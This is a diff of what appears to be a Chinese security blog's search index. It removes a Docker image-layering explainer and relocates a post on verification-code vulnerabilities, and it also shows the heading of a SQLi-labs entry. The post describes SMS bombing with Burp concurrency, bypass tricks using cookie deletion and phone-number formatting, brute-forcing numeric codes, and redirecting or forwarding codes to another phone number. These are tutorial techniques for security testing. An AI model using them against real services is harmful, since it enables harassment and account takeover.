-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630378194134-f0a43a44-9cb2-42da-9175-edcc615c4fe6.png" alt="img"></p>
-<p>&emsp;&emsp;平时我们安装进虚拟机的CentOS都是好几个G，为什么Docker这里才200M？</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630378258217-0d43a7c0-6a45-4f54-a4ee-30bfba0c7b89.png" alt="img"></p>
-<p>&emsp;&emsp;对于一个精简的OS，RootfFS可以很小，只需要包含最基本的命令，工具和程序库就可以了，因为底层直接用Host的kernel，自己只需要提供RootFS就可以了。由此可见对于不同的linux发行版，BootFS基本是一致的，RootFS会有差别，因此不同的发行版可以公用BootFS。</p>
-<h2 id="3、分层理解"><a href="#3、分层理解" class="headerlink" title="3、分层理解"></a>3、分层理解</h2><h3 id="（1）分层的镜像"><a href="#（1）分层的镜像" class="headerlink" title="（1）分层的镜像"></a>（1）分层的镜像</h3><p>&emsp;&emsp;我们可以去下载一个镜像，注意观察下载的日志输出，可以看到是一层一层的在下载！</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630378524848-56f34cbd-f790-4491-bdd2-420762fb2cc0.png" alt="img"></p>
-<p>&emsp;&emsp;思考：为什么Docker镜像要采用这种分层的结构呢？</p>
-<p>&emsp;&emsp;最大的好处，我觉得莫过于是资源共享了！比如有多个镜像都从相同的Base镜像构建而来，那么宿主机只需在磁盘上保留一份base镜像，同时内存中也只需要加载一份base镜像，这样就可以为所有的容器服务了，且镜像的每一层都可以被共享。</p>
-<p>&emsp;&emsp;查看镜像分层的方式可以通过<code>docker image inspect 镜像名</code>命令！</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630379789310-2a328dcd-b855-4773-aa75-f440c93564d7.png" alt="img"></p>
-<h3 id="（2）理解"><a href="#（2）理解" class="headerlink" title="（2）理解"></a>（2）理解</h3><p>&emsp;&emsp;所有的Docker镜像都起始于一个基础镜像层，当进行修改或增加新的内容时，就会在当前镜像层之上，创建新的镜像层。</p>
-<p>&emsp;&emsp;举一个简单的例子，假如基于Ubuntu Linux 16.04创建一个新的镜像，这就是新镜像的第一层；如果在该镜像中添加Python包，就会在基础镜像层之上创建第二个镜像层；如果继续添加一个安全补丁，就会创建第三个镜像层。</p>
-<p>&emsp;&emsp;该镜像当前已经包含3个镜像层，如下图所示（这只是一个用于演示的很简单的例子）</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630379931355-662a173d-b5ac-4619-b929-442a4c543d46.png" alt="img"></p>
-<p>&emsp;&emsp;在添加额外的镜像层的同时,镜像始终保持是当前所有镜像的组合，理解这一点点常重要。 图中举了一个简单的例子，每个镜像包含3个文件，而镜像包含了来自两个镜像层的6个文件。</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630379992732-33c35650-e3dc-4a97-bb5e-39ab82693187.png" alt="img"></p>
-<p>&emsp;&emsp;上图中的镜像层跟之前图中的略有区别，主要目的是便于展示文件。下图中展示了一个稍微复杂的三层镜像，在外部看来整个镜像只有6个文件，这是因为最上层中的文件7是文件5的一个更新版本。</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630380069106-5f074aae-bb2e-40aa-b8ba-07430052ebe6.png" alt="img"></p>
-<p>&emsp;&emsp;这种情况下，上层镜像层中的文件覆盖了底层镜像层中的文件。这样就使得文件的更新版本作为一个新镜像层添加到镜像当中。</p>
-<p>&emsp;&emsp;Docker通过存储引擎（新版本采用快照机制）的方式来实现镜像层堆栈,，保证多镜像层对外展示为统一的文件系统。</p>
-<p>&emsp;&emsp;Linux上可用的存储引擎有AUFS、Overlay2、Device Mapper、Btrfs以及ZFS。顾名思义，每种存储引擎都基于Linux中对应的文件系统或者块设备技术，并且每种存储引擎擎都有其独有的性能特点。</p>
-<p>&emsp;&emsp;Docker在Windows上仅支持windowsfilter一种存储引擎，该引擎基于NTFS文件系统之上实现了分层和CoW[1]。</p>
-<p>&emsp;&emsp;下图展示了与系统显示相同的三层镜像。所有镜像层堆叠并合并，对外提供统一的视图。</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630380496024-abad9527-7903-4fc7-a9ed-a7874baa30b8.png" alt="img"></p>
-<h3 id="（3）特点"><a href="#（3）特点" class="headerlink" title="（3）特点"></a>（3）特点</h3><p>&emsp;&emsp;Docker镜像都是只读的，当容器启动时，一个新的可写层被加载到镜像的顶部！</p>
-<p>&emsp;&emsp;这一层就是我们通常说的容器层，容器之下的都叫镜像层！</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630380628445-60392a4a-a129-45e5-a53a-050579f46cd0.png" alt="img"></p>
-]]></content>
-  </entry>
-  <entry>
     <title>sqlilabs 1-4</title>
     <url>/post/f9788371.html</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="第一关：GET-报错注入-单引号-字符型注入"><a href="#第一关：GET-报错注入-单引号-字符型注入" class="headerlink" title="第一关：GET-报错注入-单引号-字符型注入"></a>第一关：GET-报错注入-单引号-字符型注入</h1><h2 id="1-1-判断闭合方式"><a href="#1-1-判断闭合方式" class="headerlink" title="1.1 判断闭合方式"></a>1.1 判断闭合方式</h2><ul>
@@ -7443,68 +7443,6 @@
       </tags>
   </entry>
   <entry>
-    <title>关于验证码的那些漏洞</title>
-    <url>/post/48a6d673.html</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>最近看到十二师傅写了篇关于验证码漏洞的文章，觉得总结得很好，也学到了一些新思路，让我受益匪浅，原文链接：</p>
-<p><a href="https://www.yuque.com/shier-mfbht/qh4bgb/zcee3k">https://www.yuque.com/shier-mfbht/qh4bgb/zcee3k</a></p>
-<h1 id="一、短信轰炸"><a href="#一、短信轰炸" class="headerlink" title="一、短信轰炸"></a>一、短信轰炸</h1><p>这类漏洞存在的原因是没有对短信验证码的发送时间、用户及其IP作一些限制。</p>
-<h3 id="1、正常的短信轰炸"><a href="#1、正常的短信轰炸" class="headerlink" title="1、正常的短信轰炸"></a>1、正常的短信轰炸</h3><p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657548221735-3d287e51-0c22-4f32-a11e-e3461206f09d.png" alt="img"></p>
-<p>burp一直发包即可</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657548238490-b0b6fef6-3aa6-447b-b93f-15a3561f9df4.png" alt="img"></p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657548267171-baa3f5d5-2ee1-4c2f-9277-71ca5856ca0c.png" alt="img"></p>
-<h3 id="2、并发绕过"><a href="#2、并发绕过" class="headerlink" title="2、并发绕过"></a>2、并发绕过</h3><p>做了限制咋办？可以试试并发(万物皆可并发)</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657548288920-7829946b-8f55-448e-a09c-4bf230b89b20.png" alt="img"></p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657548293630-75b3902d-43bd-491f-baf0-c3cbbd85b5a2.png" alt="img">    使用<code>turbo intruder</code>插件进行并发。</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657548692068-c6acca6a-4c0d-43d0-a77e-faa44c5ce993.png" alt="img"></p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657548719465-d923a439-b862-4fa5-b1d0-01e620bed90c.png" alt="img"></p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657549918362-4e740287-7b46-4f37-8ba9-b516011af3d8.jpeg" alt="img"></p>
-<p>并发次数越大是不是轰炸就越多</p>
-<h3 id="3、删除Cookie绕过"><a href="#3、删除Cookie绕过" class="headerlink" title="3、删除Cookie绕过"></a>3、删除Cookie绕过</h3><p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657548916343-2489537a-ca97-43b3-9029-4ee9f9a72855.png" alt="img"></p>
-<p>可以尝试把cookie删掉，有些开发就可能根据cookie判断验证码是否获取过</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657548933758-d03bf4e8-ee1f-4d41-b95a-96bf78d2b55c.png" alt="img"></p>
-<h3 id="4、特殊格式绕过"><a href="#4、特殊格式绕过" class="headerlink" title="4、特殊格式绕过"></a>4、特殊格式绕过</h3><ol>
-<li>手机号码前后加空格，86，086，0086，+86，0，00，/r,/n, 以及特殊符号等</li>
-<li>修改cookie，变量，返回</li>
-<li><code>138888888889</code> 12位经过短信网关取前11位，导致短信轰炸</li>
-<li>进行能解析的编码。</li>
-</ol>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657549226009-fc07971f-8cf0-49dc-8d6a-89b9b51f1ab6.png" alt="img"></p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657549221100-a2d56d6a-2737-4ff7-870d-1a08c494e952.png" alt="img"></p>
-<h1 id="二、暴力破解（任意用户登录注册）"><a href="#二、暴力破解（任意用户登录注册）" class="headerlink" title="二、暴力破解（任意用户登录注册）"></a>二、暴力破解（任意用户登录注册）</h1><p>服务端未对验证时间、次数作出限制，存在爆破的可能性。简单的系统存在可以直接爆破的可能性，但做过一些防护的系统还得进行一些绕过才能进行爆破。 </p>
-<p>burpsuite对纯数字验证码爆破时间估计：</p>
-<ul>
-<li>对于4位纯数字验证码：从0000~9999的10000种可能用多线程在5分钟内跑完并不是很难。 </li>
-<li>对于6位纯数字验证码：六位数的验证码1000000位，单从爆破时间上来看就比4位数的多100倍。</li>
-</ul>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657549446799-c3c77bd9-8d80-4e50-9b3b-6139dd8313cd.png" alt="img"></p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657549451102-58edbada-727e-4b73-9a72-9bccb9f4c0e7.png" alt="img"></p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657549462214-9942ac48-9e26-461f-bda7-9186fd253130.png" alt="img"></p>
-<h1 id="三、验证码回显"><a href="#三、验证码回显" class="headerlink" title="三、验证码回显"></a>三、验证码回显</h1><p>验证码在返回包，观察包即可</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657549489713-45dcb32b-1861-4a4f-8e3b-b9d6c6c95227.png" alt="img"></p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657549502881-a7774fcc-ed13-47f2-97bb-26eb9cb0f238.png" alt="img"></p>
-<h1 id="四、验证码绕过"><a href="#四、验证码绕过" class="headerlink" title="四、验证码绕过"></a>四、验证码绕过</h1><p>用户绑定了手机号，正常来说是获取绑定手机号的短信，通过burp修改成其他手机号</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657549575648-bb8743bc-401c-4850-a95b-4994447f2dc5.png" alt="img"></p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657549580750-6f272f78-2b58-4f8d-91d1-a173da998f9c.png" alt="img"></p>
-<p>把这个手机号改成其他手机号的</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657549590420-3c1b9540-6e17-4eb6-9dc9-100993e3b2ef.png" alt="img"></p>
-<p>点击提交，抓包改成其他刚刚接收短信的手机号</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657549602079-38e288a7-ae0b-42a6-b0a1-5f2c437a4a57.png" alt="img"></p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657549607812-3520bea5-8135-45d0-b17f-8c46e0e33c64.png" alt="img"></p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657549612419-49e1ebee-76b9-4557-ae53-12c8fb7089d6.png" alt="img"></p>
-<h1 id="五、验证码转发"><a href="#五、验证码转发" class="headerlink" title="五、验证码转发"></a>五、验证码转发</h1><p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657549623380-676c8547-dec5-407d-a0c7-dde791210502.png" alt="img"></p>
-<p>加个逗号后面接上需要转发的手机号，因为开发可能使用数组就导致同时把验证码发给两个手机号</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657549738912-57b0e432-cf06-4e1b-b742-08d77e13d92c.png" alt="img"></p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657549745451-b3941f52-4a2f-496c-8406-8528124ba57f.png" alt="img"></p>
-]]></content>
-      <categories>
-        <category>Web安全</category>
-      </categories>
-      <tags>
-        <tag>Web安全</tag>
-        <tag>验证码</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>使用Watchdog监控文件</title>
     <url>/post/8501a278.html</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>好久没有更新了，最近刚到家，调整了下状态继续学习更新</p>
@@ -7604,6 +7542,68 @@
       </categories>
       <tags>
         <tag>Python</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>关于验证码的那些漏洞</title>
+    <url>/post/48a6d673.html</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>最近看到十二师傅写了篇关于验证码漏洞的文章，觉得总结得很好，也学到了一些新思路，让我受益匪浅，原文链接：</p>
+<p><a href="https://www.yuque.com/shier-mfbht/qh4bgb/zcee3k">https://www.yuque.com/shier-mfbht/qh4bgb/zcee3k</a></p>
+<h1 id="一、短信轰炸"><a href="#一、短信轰炸" class="headerlink" title="一、短信轰炸"></a>一、短信轰炸</h1><p>这类漏洞存在的原因是没有对短信验证码的发送时间、用户及其IP作一些限制。</p>
+<h3 id="1、正常的短信轰炸"><a href="#1、正常的短信轰炸" class="headerlink" title="1、正常的短信轰炸"></a>1、正常的短信轰炸</h3><p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657548221735-3d287e51-0c22-4f32-a11e-e3461206f09d.png" alt="img"></p>
+<p>burp一直发包即可</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657548238490-b0b6fef6-3aa6-447b-b93f-15a3561f9df4.png" alt="img"></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657548267171-baa3f5d5-2ee1-4c2f-9277-71ca5856ca0c.png" alt="img"></p>
+<h3 id="2、并发绕过"><a href="#2、并发绕过" class="headerlink" title="2、并发绕过"></a>2、并发绕过</h3><p>做了限制咋办？可以试试并发(万物皆可并发)</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657548288920-7829946b-8f55-448e-a09c-4bf230b89b20.png" alt="img"></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657548293630-75b3902d-43bd-491f-baf0-c3cbbd85b5a2.png" alt="img">    使用<code>turbo intruder</code>插件进行并发。</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657548692068-c6acca6a-4c0d-43d0-a77e-faa44c5ce993.png" alt="img"></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657548719465-d923a439-b862-4fa5-b1d0-01e620bed90c.png" alt="img"></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657549918362-4e740287-7b46-4f37-8ba9-b516011af3d8.jpeg" alt="img"></p>
+<p>并发次数越大是不是轰炸就越多</p>
+<h3 id="3、删除Cookie绕过"><a href="#3、删除Cookie绕过" class="headerlink" title="3、删除Cookie绕过"></a>3、删除Cookie绕过</h3><p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657548916343-2489537a-ca97-43b3-9029-4ee9f9a72855.png" alt="img"></p>
+<p>可以尝试把cookie删掉，有些开发就可能根据cookie判断验证码是否获取过</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657548933758-d03bf4e8-ee1f-4d41-b95a-96bf78d2b55c.png" alt="img"></p>
+<h3 id="4、特殊格式绕过"><a href="#4、特殊格式绕过" class="headerlink" title="4、特殊格式绕过"></a>4、特殊格式绕过</h3><ol>
+<li>手机号码前后加空格，86，086，0086，+86，0，00，/r,/n, 以及特殊符号等</li>
+<li>修改cookie，变量，返回</li>
+<li><code>138888888889</code> 12位经过短信网关取前11位，导致短信轰炸</li>
+<li>进行能解析的编码。</li>
+</ol>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657549226009-fc07971f-8cf0-49dc-8d6a-89b9b51f1ab6.png" alt="img"></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657549221100-a2d56d6a-2737-4ff7-870d-1a08c494e952.png" alt="img"></p>
+<h1 id="二、暴力破解（任意用户登录注册）"><a href="#二、暴力破解（任意用户登录注册）" class="headerlink" title="二、暴力破解（任意用户登录注册）"></a>二、暴力破解（任意用户登录注册）</h1><p>服务端未对验证时间、次数作出限制，存在爆破的可能性。简单的系统存在可以直接爆破的可能性，但做过一些防护的系统还得进行一些绕过才能进行爆破。 </p>
+<p>burpsuite对纯数字验证码爆破时间估计：</p>
+<ul>
+<li>对于4位纯数字验证码：从0000~9999的10000种可能用多线程在5分钟内跑完并不是很难。 </li>
+<li>对于6位纯数字验证码：六位数的验证码1000000位，单从爆破时间上来看就比4位数的多100倍。</li>
+</ul>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657549446799-c3c77bd9-8d80-4e50-9b3b-6139dd8313cd.png" alt="img"></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657549451102-58edbada-727e-4b73-9a72-9bccb9f4c0e7.png" alt="img"></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657549462214-9942ac48-9e26-461f-bda7-9186fd253130.png" alt="img"></p>
+<h1 id="三、验证码回显"><a href="#三、验证码回显" class="headerlink" title="三、验证码回显"></a>三、验证码回显</h1><p>验证码在返回包，观察包即可</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657549489713-45dcb32b-1861-4a4f-8e3b-b9d6c6c95227.png" alt="img"></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657549502881-a7774fcc-ed13-47f2-97bb-26eb9cb0f238.png" alt="img"></p>
+<h1 id="四、验证码绕过"><a href="#四、验证码绕过" class="headerlink" title="四、验证码绕过"></a>四、验证码绕过</h1><p>用户绑定了手机号，正常来说是获取绑定手机号的短信，通过burp修改成其他手机号</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657549575648-bb8743bc-401c-4850-a95b-4994447f2dc5.png" alt="img"></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657549580750-6f272f78-2b58-4f8d-91d1-a173da998f9c.png" alt="img"></p>
+<p>把这个手机号改成其他手机号的</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657549590420-3c1b9540-6e17-4eb6-9dc9-100993e3b2ef.png" alt="img"></p>
+<p>点击提交，抓包改成其他刚刚接收短信的手机号</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657549602079-38e288a7-ae0b-42a6-b0a1-5f2c437a4a57.png" alt="img"></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657549607812-3520bea5-8135-45d0-b17f-8c46e0e33c64.png" alt="img"></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657549612419-49e1ebee-76b9-4557-ae53-12c8fb7089d6.png" alt="img"></p>
+<h1 id="五、验证码转发"><a href="#五、验证码转发" class="headerlink" title="五、验证码转发"></a>五、验证码转发</h1><p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657549623380-676c8547-dec5-407d-a0c7-dde791210502.png" alt="img"></p>
+<p>加个逗号后面接上需要转发的手机号，因为开发可能使用数组就导致同时把验证码发给两个手机号</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657549738912-57b0e432-cf06-4e1b-b742-08d77e13d92c.png" alt="img"></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1657549745451-b3941f52-4a2f-496c-8406-8528124ba57f.png" alt="img"></p>
+]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>Web安全</tag>
+        <tag>验证码</tag>
       </tags>
   </entry>
   <entry>
